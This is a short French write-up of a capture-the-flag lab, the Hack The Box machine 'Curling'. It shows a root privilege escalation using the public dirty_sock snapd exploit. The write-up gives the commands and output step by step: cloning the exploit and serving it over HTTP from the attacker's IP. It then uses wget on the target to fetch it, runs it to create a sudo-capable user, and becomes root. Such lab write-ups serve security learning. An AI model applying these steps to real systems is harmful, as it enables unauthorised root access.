# Privesc Curling

Bonjour à tous,

J'ai découvert un moyen d'être root sur une machine Curling, à travers une technique simple, efficace et rapide.
Il est possible d'obtenir les permissions root via le programme dirty_sock; une vulnérabilité très récente, présente sur les machines Ubuntu.

Voici les explications pour le root sur Curling. C'est très simple !

Dirty Sock
----

Vous devez simplement installer l'outil dirty_sock avec git, ensuite transférez le script sur la machine ciblée, et éxecutez le script.

    root@Computer:~/htb/writeup/Curling# git clone https://github.com/initstring/dirty_sock.git
    Clonage dans 'dirty_sock'...
    remote: Enumerating objects: 47, done.
    remote: Counting objects: 100% (47/47), done.
    remote: Compressing objects: 100% (19/19), done.
    remote: Total 47 (delta 26), reused 47 (delta 26), pack-reused 0
    Dépaquetage des objets: 100% (47/47), fait.
    Vérification de la connectivité... fait.

Après avoir installé et cloné sur votre machine physique, il suffit de transférer le fichier python sur la machine ciblée, et éxecuter le script. Pour les transfert de fichier, je vous conseille SimpleHTTPServer.

    root@Computer:~/htb/writeup/Curling# python -m SimpleHTTPServer 9001
    Serving HTTP on 0.0.0.0 port 9001 ...
    
Exécutez ça sur votre machine; il faut être impérativement présent dans le dossier dirty_sock.
Une fois la commande tapée, il vous suffit d'utiliser wget sur la machine ciblée, et de télécharger les deux scripts.

    floris@curling:/tmp$ wget http://10.10.15.173:9001/dirty_sockv1.py -O dirty_sockv1.py
    [..SNIP...]
    Saving to: ‘dirty_sockv1.py’

    dirty_sockv1.py                          100%[==================================================================================>]   5.37K  --.-KB/s    in 0.001s  

    2019-03-30 20:24:21 (10.1 MB/s) - ‘dirty_sockv1.py’ saved [5501/5501]

    floris@curling:/tmp$ wget http://10.10.15.173:9001/dirty_sockv2.py -O dirty_sockv2.py
    [...SNIP...]
    Saving to: ‘dirty_sockv2.py’

    dirty_sockv2.py                          100%[==================================================================================>]   8.49K  --.-KB/s    in 0s      

    2019-03-30 20:24:39 (109 MB/s) - ‘dirty_sockv2.py’ saved [8696/8696]

    floris@curling:/tmp$
    
Le résultat sur votre machine physique, si nous regardons bien, a transférer le fichier correctement, sans aucune erreur.

    10.10.10.150 - - [30/Mar/2019 21:24:21] "GET /dirty_sockv1.py HTTP/1.1" 200 -
    10.10.10.150 - - [30/Mar/2019 21:24:39] "GET /dirty_sockv2.py HTTP/1.1" 200 -
    
Ensuite, vous devez simplement exécuter l'outil dirty_sock2.py, et attendre que le programme crée un utilisateur dirty_sock et vous connecter avec la commande su.
    

    floris@curling:/tmp$ python3 dirty_sockv2.py 

          ___  _ ____ ___ _   _     ____ ____ ____ _  _ 
          |  \ | |__/  |   \_/      [__  |  | |    |_/  
          |__/ | |  \  |    |   ___ ___] |__| |___ | \_ 
                           (version 2)

    //=========[]==========================================\\
    || R&D     || initstring (@init_string)                ||
    || Source  || https://github.com/initstring/dirty_sock ||
    || Details || https://initblog.com/2019/dirty-sock     ||
    \\=========[]==========================================//


    [+] Slipped dirty sock on random socket file: /tmp/zkvlivrbmj;uid=0;
    [+] Binding to socket file...
    [+] Connecting to snapd API...
    [+] Deleting trojan snap (and sleeping 5 seconds)...
    [+] Installing the trojan snap (and sleeping 8 seconds)...
    [+] Deleting trojan snap (and sleeping 5 seconds)...



    ********************
    Success! You can now `su` to the following account and use sudo:
       username: dirty_sock
       password: dirty_sock
    ********************

Tapez la commande sudo su pour vous connecter en tant qu'utilisateur (dirty sock).

    floris@curling:/tmp$ su - dirty_sock
    Password: 
    dirty_sock@curling:~$
    
Une fois que vous êtes connecté en tant que dirty_sock, vous devez taper la commande sudo su, et mettre le mot de pass utilisateur pour vous connecter en tant que root, ainsi obtenir un accès root sur la machine.

    root@curling:/home/dirty_sock# sudo su
    [sudo] password for dirty_sock: 
    root@curling:/home/dirty_sock#
    
Voilà, nous sommes root !

[![forthebadge made-with-python](https://media1.giphy.com/media/4PSEQpvV5wUpnmpP1l/giphy.gif?cid=790b76115c9fd2056341686e77c521a2)]
